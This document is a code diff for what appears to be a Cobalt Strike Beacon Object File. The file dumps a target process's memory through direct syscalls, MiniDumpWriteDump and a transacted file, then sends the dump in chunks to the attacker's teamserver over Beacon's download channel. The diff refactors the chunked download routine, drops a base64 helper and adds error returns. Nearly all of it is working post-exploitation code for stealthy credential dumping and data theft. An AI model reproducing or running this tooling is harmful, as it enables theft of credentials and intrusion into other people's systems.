@@ -6,164 +6,127 @@
 #include "syscalls.h"
 #include "beacon.h"
 
-// CODE FOR DOWNLOAD START
+/*Download File*/
+void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize) {
 
-WINBASEAPI void WINAPI MSVCRT$srand(int initial);
-WINBASEAPI int WINAPI MSVCRT$rand();
-WINBASEAPI time_t WINAPI MSVCRT$time(time_t *time);
-//WINBASEAPI void WINAPI MSVCRT$sprintf(char*, char[], int);
-WINBASEAPI void WINAPI MSVCRT$sprintf(char*, char[], ...);
-
-void downloadFile(char fileName[], int fileNameLength, char fileData[], int fileLength) {
-
-
-    //BeaconPrintf(CALLBACK_OUTPUT, "fileLength: %d", fileLength);
-    //BeaconPrintf(CALLBACK_OUTPUT, "fileData: %s", fileData);
-
-    // Intializes random number generator 
+    //Intializes random number generator to create fileId 
     time_t t;
-
-    MSVCRT$srand((unsigned) MSVCRT$time(&t));
-
+    MSVCRT$srand((unsigned)MSVCRT$time(&t));
     int fileId = MSVCRT$rand();
 
-    // hard-coded because I'm too dumb to be able to figure out how to do a random number in BOF...
-    //int fileId = 1236;
-
-
-    //BeaconPrintf(CALLBACK_OUTPUT, "fileId: %d", fileId);
-
-
-    // 8 bytes for fileId and fileLength
-    int messageLength = 8 + fileNameLength;
-    //BeaconPrintf(CALLBACK_OUTPUT, "messageLength: %d", messageLength);
+    //8 bytes for fileId and fileSize
+    int messageLength = downloadFileNameLength + 8;
+    char* packedData = (char*)MSVCRT$malloc(messageLength);
  
-
-    char* packedData = (char*) MSVCRT$malloc(messageLength);
- 
-    // pack on fileId as 4-byte int first
+    //pack on fileId as 4-byte int first
     packedData[0] = (fileId >> 24) & 0xFF;
     packedData[1] = (fileId >> 16) & 0xFF;
     packedData[2] = (fileId >> 8) & 0xFF;
     packedData[3] = fileId & 0xFF;
 
-    // pack on fileLength as 4-byte int second
-    packedData[4] = (fileLength >> 24) & 0xFF;
-    packedData[5] = (fileLength >> 16) & 0xFF;
-    packedData[6] = (fileLength >> 8) & 0xFF;
-    packedData[7] = fileLength & 0xFF;
+    //pack on fileSize as 4-byte int second
+    packedData[4] = (fileSize >> 24) & 0xFF;
+    packedData[5] = (fileSize >> 16) & 0xFF;
+    packedData[6] = (fileSize >> 8) & 0xFF;
+    packedData[7] = fileSize & 0xFF;
 
     int packedIndex = 8;
 
-    // pack on the file name last
-    for (int i = 0; i < fileNameLength; i++) {
+    //pack on the file name last
+    for (int i = 0; i < downloadFileNameLength; i++) {
         packedData[packedIndex] = fileName[i];
         packedIndex++;
     }
 
-    BeaconOutput(CALLBACK_FILE, packedData, messageLength);
+     BeaconOutput(CALLBACK_FILE, packedData, messageLength);
 
-
-    if (fileLength > (1024 * 900)){
-        // It's a file that needs to be chunked
-
-      // Lets see how many times this constant goes into our file size, then add one (because if it doesn't go in at all, we still have one chunk)
-      int numOfChunks = (fileLength / (1024 * 900)) + 1;
-      //int numOfChunks = 1;
-      //BeaconPrintf(CALLBACK_OUTPUT, "numOfChunks: %d", numOfChunks);
-
+    if (fileSize > (1024 * 900)){
+      
+      //Lets see how many times this constant goes into our file size, then add one (because if it doesn't go in at all, we still have one chunk)
+      int numOfChunks = (fileSize / (1024 * 900)) + 1;
       int index = 0;
       int chunkSize = 1024 * 900;
 
-      while(index < fileLength) {
-        if (fileLength - index > chunkSize){
-            // We have plenty of room, grab the chunk and move on
-
-            // first 4 are the fileId
-            // Then account for length of file
-            // then a byte for the good-measure null byte to be included
-            // then lastly is the 4-byte int of the fileLength
+      while(index < fileSize) {
+        if (fileSize - index > chunkSize){//We have plenty of room, grab the chunk and move on
+            
+            /*First 4 are the fileId 
+	    then account for length of file
+	    then a byte for the good-measure null byte to be included
+            then lastly is the 4-byte int of the fileSize*/
             int chunkLength = 4 + chunkSize;
-            //BeaconPrintf(CALLBACK_OUTPUT, "chunkLength: %d", chunkLength);
-
             char* packedChunk = (char*) MSVCRT$malloc(chunkLength);
-            // pack on fileId as 4-byte int first
+            
+            //pack on fileId as 4-byte int first
             packedChunk[0] = (fileId >> 24) & 0xFF;
             packedChunk[1] = (fileId >> 16) & 0xFF;
             packedChunk[2] = (fileId >> 8) & 0xFF;
             packedChunk[3] = fileId & 0xFF;
 
             int chunkIndex = 4;
-            // pack on the file name last
+
+            //pack on the file name last
             for (int i = index; i < index + chunkSize; i++) {
-                packedChunk[chunkIndex] = fileData[i];
+                packedChunk[chunkIndex] = returnData[i];
                 chunkIndex++;
             }
 
-            BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
+	     BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
 
-        } else {
-            // This chunk is smaller than the chunkSize, so we have to be careful with our measurements
-
-            int lastChunkLength = fileLength - index + 4;
-            
-
-            //BeaconPrintf(CALLBACK_OUTPUT, "lastChunkLength: %d", lastChunkLength);
-
+        } else {//This chunk is smaller than the chunkSize, so we have to be careful with our measurements
+           
+	    int lastChunkLength = fileSize - index + 4;
             char* lastChunk = (char*) MSVCRT$malloc(lastChunkLength);
-            // pack on fileId as 4-byte int first
+            
+	    //pack on fileId as 4-byte int first
             lastChunk[0] = (fileId >> 24) & 0xFF;
             lastChunk[1] = (fileId >> 16) & 0xFF;
             lastChunk[2] = (fileId >> 8) & 0xFF;
             lastChunk[3] = fileId & 0xFF;
-
             int lastChunkIndex = 4;
-            // pack on the file name last
-            //BeaconPrintf(CALLBACK_OUTPUT, "Index: %d", index);
-            for (int i = index; i < fileLength; i++) {
-                lastChunk[lastChunkIndex] = fileData[i];
+            
+	    //pack on the file name last
+            for (int i = index; i < fileSize; i++) {
+                lastChunk[lastChunkIndex] = returnData[i];
                 lastChunkIndex++;
             }
-
-
-            BeaconOutput(CALLBACK_FILE_WRITE, lastChunk, lastChunkLength);
-
-
+		BeaconOutput(CALLBACK_FILE_WRITE, lastChunk, lastChunkLength);
         }
-        //BeaconPrintf(CALLBACK_OUTPUT, "Index: %d", index);
-        index = index + chunkSize;
+        
+	index = index + chunkSize;
 
       }
 
     } else {
 
-        // first 4 are the fileId
-        // Then account for length of file
-        // then a byte for the good-measure null byte to be included
-        // then lastly is the 4-byte int of the fileLength
-        int chunkLength = 4 + fileLength;
-
+        /*first 4 are the fileId
+        then account for length of file
+        then a byte for the good-measure null byte to be included
+        then lastly is the 4-byte int of the fileSize*/
+        int chunkLength = 4 + fileSize;
         char* packedChunk = (char*) MSVCRT$malloc(chunkLength);
-        // pack on fileId as 4-byte int first
+        
+        //pack on fileId as 4-byte int first
         packedChunk[0] = (fileId >> 24) & 0xFF;
         packedChunk[1] = (fileId >> 16) & 0xFF;
         packedChunk[2] = (fileId >> 8) & 0xFF;
         packedChunk[3] = fileId & 0xFF;
-
         int chunkIndex = 4;
-        // pack on the file name last
-        for (int i = 0; i < fileLength; i++) {
-            packedChunk[chunkIndex] = fileData[i];
+
+        //pack on the file name last
+        for (int i = 0; i < fileSize; i++) {
+            packedChunk[chunkIndex] = returnData[i];
             chunkIndex++;
         }
-
+	
         BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
     }
 
 
-    // We need to tell the teamserver that we are done writing to this fileId
+    //We need to tell the teamserver that we are done writing to this fileId
     char packedClose[4];
-    // pack on fileId as 4-byte int first
+    
+    //pack on fileId as 4-byte int first
     packedClose[0] = (fileId >> 24) & 0xFF;
     packedClose[1] = (fileId >> 16) & 0xFF;
     packedClose[2] = (fileId >> 8) & 0xFF;
@@ -173,52 +136,7 @@ void downloadFile(char fileName[], int fileNameLength, char fileData[], int file
     return; 
 }   
 
-// CODE FOR DOWNLOAD END
-
-
-//Base64 encode
-char* base64_encode(const unsigned char *data, size_t input_length, size_t *output_length) {
- 
-    static char encoding_table[] = {
-                                'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
-                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
-                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
-                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
-                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
-                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
-                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
-                                '4', '5', '6', '7', '8', '9', '+', '/'
-                                };
-
-static int mod_table[] = { 0, 2, 1 };
-
-    *output_length = 4 * ((input_length + 2) / 3);
- 
-    char *encoded_data = MSVCRT$malloc(*output_length);
-    if (encoded_data == NULL) return NULL;
- 
-    for (int i = 0, j = 0; i < input_length;) {
-        
-        unsigned int octet_a = i < input_length ? (unsigned char)data[i++] : 0;
-        unsigned int octet_b = i < input_length ? (unsigned char)data[i++] : 0;
-        unsigned int octet_c = i < input_length ? (unsigned char)data[i++] : 0;
- 
-        unsigned int triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
- 
-        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
-        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
-        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
-        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
-    }
- 
-    for (int i = 0; i < mod_table[input_length % 3]; i++)
-        encoded_data[*output_length - 1 - i] = '=';
- 
-    return encoded_data;
-}
-
 /*Begin MiniDumpWriteDump reactOS Code*/
-
 static BOOL fetch_process_info(struct dump_context* dc)
 {
     ULONG       buf_size = 0x1000;
@@ -780,7 +698,7 @@ void go(char* args, int length) {
 	BeaconDataParse(&parser, args, length);
 	PID = BeaconDataInt(&parser);
 	outputFile = BeaconDataExtract(&parser, NULL);
-    int outputFileLength = BeaconDataInt(&parser);
+        int outputFileLength = BeaconDataInt(&parser);
 	
 	//Declare variables
 	void* returnData = NULL;
@@ -813,6 +731,7 @@ void go(char* args, int length) {
 	if (status != 0) {
 
 		BeaconPrintf(CALLBACK_ERROR, "[-] NtOpenProcess failed with status %lx\n", status);
+	        return;
 	}
 	else {
 
@@ -825,6 +744,7 @@ void go(char* args, int length) {
 	if (status != 0) {
 
 		BeaconPrintf(CALLBACK_OUTPUT, "[-] NtCreateTransaction failed with status %lx\n", status);
+	        return;
 	}
 	else {
 
@@ -837,6 +757,7 @@ void go(char* args, int length) {
 	if (status != 1) {
 
 		BeaconPrintf(CALLBACK_OUTPUT, "[-] RtlSetCurrentTransaction failed with status %lx\n", status);
+		return;
 	}
 	else {
 
@@ -859,6 +780,7 @@ void go(char* args, int length) {
 	if (status != 0) {
 
 		BeaconPrintf(CALLBACK_OUTPUT, "[-] NtCreateFile failed with status %lx\n", status);
+		return;
 	}
 	else {
 		BeaconPrintf(CALLBACK_OUTPUT, "[+] NtCreateFile returned HANDLE 0x%p\n", hFile);
@@ -870,6 +792,7 @@ void go(char* args, int length) {
 	if (status != 1) {
 
 		BeaconPrintf(CALLBACK_OUTPUT, "[-] RtlSetCurrentTransaction failed with status %lx\n", status);
+	        return;
 	}
 	else {
 
@@ -881,6 +804,7 @@ void go(char* args, int length) {
 		
 	if (success = 0) {
 		BeaconPrintf(CALLBACK_OUTPUT, "[-] MiniDump failed.  GetLastError = (%ld)\n", KERNEL32$GetLastError());
+		return;
 	}
 	else
 	{
@@ -899,6 +823,7 @@ void go(char* args, int length) {
 	if (status != 0) {
 
 		BeaconPrintf(CALLBACK_OUTPUT, "[-] NtCreateSection failed with status %lx\n", status);
+		return;
 	}
 	else {
 	
@@ -910,6 +835,7 @@ void go(char* args, int length) {
 	if (status != 0) {
 
 		BeaconPrintf(CALLBACK_OUTPUT, "[-] NtMapViewOfSection failed with status %lx\n", status);
+		return;
 	}
 	else {
 
@@ -917,38 +843,26 @@ void go(char* args, int length) {
 
 	}
 	
-	/*Note: At this point returnData holds our memory dump -> You could choose to encrypt it, compress it, write it to disk somwhere, whatever.  You do you*/
+	/*Note: At this point returnData holds our memory dump -> You could choose to encrypt it, compress it, write it to disk somwhere, whatever.  You do you but we are going to download it via beacons native download API*/
 
-    // If no output name is provided, the format will be "Mem:\[pid].dmp" so our length will be 5(mem:\) + count + 4(.dmp)
-
-    /* Run loop till num is greater than 0 */
-    int count = 0;
-    int tempPid = PID;
-    int fileNameLength;
+    //If no output name is provided, the format will be "Mem:\[pid].dmp"
+    int downloadFileNameLength;
     char* fileName;
-    do
-    {
-        /* Increment digit count */
-        count++;
-
-        /* Remove last digit of 'num' */
-        tempPid /= 10;
-    } while(tempPid != 0);
-
-
+  
     if(!outputFile) {
-        // No name was provided, so we will use the pid as the basename
-        fileNameLength = count + 9;
-        fileName = (char*) MSVCRT$malloc(fileNameLength);
+        //No name was provided, so we will use the pid as the basename
+        downloadFileNameLength = MSVCRT$_snprintf(NULL,0,"%i",PID) + 9;
+        fileName = (char*) MSVCRT$malloc(downloadFileNameLength);
         MSVCRT$sprintf(fileName, "mem:\\%d.dmp", PID);
     } else {
-        // User provided a name to use for output
-        fileNameLength = outputFileLength + 9;
-        fileName = (char*) MSVCRT$malloc(fileNameLength);
+        //User provided a name to use for output
+        downloadFileNameLength = outputFileLength + 9;
+        fileName = (char*) MSVCRT$malloc(downloadFileNameLength);
         MSVCRT$sprintf(fileName, "mem:\\%s.dmp", outputFile);
     }
 
-	downloadFile(fileName, fileNameLength, returnData, fileSize);
+    //Download memory dump
+    downloadFile(fileName, downloadFileNameLength, returnData, fileSize);
 
     //Close Handles
     status = NtClose(hProc);
